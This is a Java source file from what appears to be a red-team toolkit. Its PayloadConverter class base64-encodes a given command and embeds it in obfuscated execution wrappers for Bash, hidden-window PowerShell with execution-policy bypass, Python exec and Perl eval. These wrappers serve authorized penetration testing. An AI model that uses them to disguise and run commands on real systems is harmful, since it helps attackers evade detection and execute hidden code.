package ffffffff0x.beryenigma.App.View.Modules.Tools.RedTeam.PayloadConverter;

import ffffffff0x.beryenigma.App.View.Modules.Encryption.Coding.BaseEncoding.Base64.Base64Impl;

import java.io.UnsupportedEncodingException;

/**
 * @author: RyuZUSUNC
 * @create: 2021-12-07 10:13
 **/

public class PayloadConverterImpl {
    final String placeHolder = "&$&$&";
    final String bashPayload = "bash -c {echo,&$&$&}|{base64,-d}|{bash,-i}";
    final String powerShellPayload = "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc &$&$&";
    final String pythonPayload = "python -c exec('&$&$&'.decode('base64'))";
    final String perlPayload = "perl -MMIME::Base64 -e eval(decode_base64('&$&$&'))";

    public String converter(String payload,String converterName) {
        return switch (converterName) {
            case "Bash" -> this.bashConverter(payload);
            case "PowerShell" -> this.powerShellConverter(payload);
            case "Python" -> this.pythonConverter(payload);
            case "Perl" -> this.perlConverter(payload);
            default -> null;
        };
    }

    private String bashConverter(String payload) {
        return this.commonConverter(bashPayload,payload);
    }

    private String powerShellConverter(String payload) {
        String bs64 = "";
        try {
            bs64 = Base64Impl.encodeToString(payload, "UTF-16LE");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return powerShellPayload.replace(placeHolder,bs64);
    }

    private String pythonConverter(String payload) {
        return this.commonConverter(pythonPayload,payload);
    }

    private String perlConverter(String payload) {
        return this.commonConverter(perlPayload,payload);
    }

    private String commonConverter(String initPayload,String payload) {
        String bs64 = "";
        try {
            bs64 = Base64Impl.encodeToString(payload, "UTF-8");
//            System.out.println(bs64);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return initPayload.replace(placeHolder,bs64);
    }
}
